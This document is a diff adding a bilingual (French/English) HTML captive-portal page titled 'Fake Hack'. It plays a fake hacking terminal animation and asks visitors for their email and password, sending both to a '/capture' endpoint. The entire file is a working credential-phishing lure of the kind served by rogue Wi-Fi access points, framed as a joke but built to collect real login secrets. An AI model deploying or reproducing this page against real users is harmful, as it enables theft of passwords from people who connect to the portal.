@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portail Captif - Fake Hack</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #000;
+            color: #0f0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .language-selection {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+        .language-selection button {
+            margin: 0 5px;
+            padding: 5px 10px;
+            background-color: #333;
+            color: #0f0;
+            border: 1px solid #0f0;
+            cursor: pointer;
+        }
+        .language-selection button.selected {
+            background-color: #0f0;
+            color: #000;
+        }
+        .main-content {
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+        .logo {
+            width: 100%;
+            max-width: 300px;
+            height: auto;
+            margin: 20px auto;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 20px 0;
+        }
+        p {
+            font-size: 16px;
+            margin: 20px 0;
+        }
+        .input-container {
+            margin: 10px 0;
+        }
+        .input-container label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .input-container input {
+            padding: 8px;
+            width: 100%;
+            font-size: 14px;
+            background-color: #000;
+            color: #0f0;
+            border: 1px solid #0f0;
+        }
+        #accept-button {
+            padding: 10px 20px;
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            margin: 20px 0;
+        }
+        #accept-button:hover {
+            background-color: #0c0;
+        }
+        .terminal {
+            background-color: #000;
+            border: 1px solid #0f0;
+            padding: 10px;
+            margin: 20px 0;
+            height: 100px;
+            overflow-y: auto;
+            font-size: 14px;
+            text-align: left;
+        }
+        .terminal p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-selection">
+        <button id="lang-en">English</button>
+        <button id="lang-fr">Français</button>
+    </div>
+    <div class="main-content">
+        <svg class="logo" version="1.1" xmlns="http://www.w3.org/2000/svg" width="100%" viewBox="0 0 2531 1070">
+            <!-- Insère ton logo SVG ici si tu en as un, sinon laisse vide -->
+        </svg>
+        <h1 id="title">Bienvenue sur le Portail de Hack</h1>
+        <div class="terminal" id="terminal">
+            <p>$ initiation de la séquence de hack...</p>
+            <p>$ contournement du pare-feu...</p>
+            <p>$ accès au mainframe...</p>
+            <p>$ téléchargement des données sensibles...</p>
+        </div>
+        <p id="paragraph">Entrez vos identifiants pour procéder au hack.</p>
+        <form action="/capture" method="post">
+            <div class="input-container">
+                <label id="email-label">Email :</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+            <div class="input-container">
+                <label id="password-label">Mot de passe :</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" id="accept-button">Hacker Maintenant</button>
+        </form>
+    </div>
+    <script>
+        const translations = {
+            en: {
+                title: "Welcome to the Hack Portal",
+                paragraph: "Enter your credentials to proceed with the hack.",
+                button: "Hack Now",
+                emailLabel: "Email:",
+                passwordLabel: "Password:"
+            },
+            fr: {
+                title: "Bienvenue sur le Portail de Hack",
+                paragraph: "Entrez vos identifiants pour procéder au hack.",
+                button: "Hacker Maintenant",
+                emailLabel: "Email :",
+                passwordLabel: "Mot de passe :"
+            }
+        };
+
+        let currentLang = 'fr';
+
+        function setLanguage(lang) {
+            currentLang = lang;
+            document.getElementById('title').textContent = translations[lang].title;
+            document.getElementById('paragraph').textContent = translations[lang].paragraph;
+            document.getElementById('accept-button').textContent = translations[lang].button;
+            document.getElementById('email-label').textContent = translations[lang].emailLabel;
+            document.getElementById('password-label').textContent = translations[lang].passwordLabel;
+
+            document.getElementById('lang-en').classList.toggle('selected', lang === 'en');
+            document.getElementById('lang-fr').classList.toggle('selected', lang === 'fr');
+        }
+
+        setLanguage('fr');
+
+        document.getElementById('lang-en').addEventListener('click', () => setLanguage('en'));
+        document.getElementById('lang-fr').addEventListener('click', () => setLanguage('fr'));
+
+        // Simulation du terminal
+        const terminal = document.getElementById('terminal');
+        const messages = [
+            "$ initiation de la séquence de hack...",
+            "$ contournement du pare-feu...",
+            "$ accès au mainframe...",
+            "$ téléchargement des données sensibles...",
+            "$ hack terminé. En attente des identifiants..."
+        ];
+        let index = 0;
+        setInterval(() => {
+            if (index < messages.length) {
+                const p = document.createElement('p');
+                p.textContent = messages[index];
+                terminal.appendChild(p);
+                terminal.scrollTop = terminal.scrollHeight;
+                index++;
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
